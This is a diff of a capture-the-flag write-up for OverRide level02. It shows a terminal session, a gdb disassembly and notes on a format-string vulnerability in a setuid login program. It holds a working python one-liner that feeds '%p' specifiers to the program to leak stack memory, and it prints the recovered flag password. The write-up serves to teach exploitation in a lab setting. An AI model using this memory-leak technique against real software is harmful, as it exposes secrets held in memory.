@@ -1,10 +1,13 @@
 level02@OverRide:~$ whoami
 level02
+
 level02@OverRide:~$ pwd
 /home/users/level02
+
 level02@OverRide:~$ ls -l
 total 12
 -rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
+
 level02@OverRide:~$ ./level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
@@ -14,8 +17,10 @@ level02@OverRide:~$ ./level02
 --[ Password: password
 *****************************************
 username does not have access!
+
 level02@OverRide:~$ gdb ./level02
 Reading symbols from /home/users/level02/level02...(no debugging symbols found)...done.
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x0000000000400814 <+0>:	push   %rbp
@@ -171,6 +176,7 @@ Dump of assembler code for function main:
    0x0000000000400ab1 <+669>:	mov    $0x1,%edi
    0x0000000000400ab6 <+674>:	callq  0x400710 <exit@plt>
 End of assembler dump.
+
 ********************************************************************************
 The level02 binary is once again a kind of login procedure, for a level03 shell.
 The main function has three buffers :
@@ -185,8 +191,9 @@ As we can pop elements from the stack by specifying more modifiers, we can print
 the content behind the username pointer on the stack => flag buffer.
 We will try filling the format of %p modifiers.
 ********************************************************************************
+
 level02@OverRide:~$ python -c "print('%p ' * 48 + '\n')" | ./level02
-level02@OverRide:~$ python -c "print('%p ' * 48 + '\n')" | ./level02
+
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
 | You must login to access this system. |
@@ -198,11 +205,13 @@ level02@OverRide:~$ python -c "print('%p ' * 48 + '\n')" | ./level02
 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873
 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070
 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
+
 ********************************************************************************
 We can see a serie of five 8-bytes addresses surrounded by nulls, corresponding
 to our flag buffer. We just have to reverse the endiannesses of theses addresses,
 concatenate them, and then convert the result in ascii to get our flag.
 ********************************************************************************
+
 4868373452506e7551397361354a414558674e5743717a377358476e68354a354d394b6650673348
 <==>
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
